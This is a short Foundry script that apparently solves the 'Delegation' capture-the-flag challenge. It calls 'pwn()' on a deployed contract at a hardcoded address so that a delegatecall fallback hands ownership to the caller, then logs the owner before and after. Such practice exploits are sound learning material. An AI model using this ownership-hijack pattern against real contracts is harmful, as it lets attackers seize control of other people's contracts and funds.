//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";

contract DelegationSolution is Script {
    Delegation public delegationInstance =
        Delegation(0xd1a529Ffb6fe184643493cE7E7611d95C887ecEF);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before: ", delegationInstance.owner());

        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));

        console.log("Owner after: ", delegationInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}
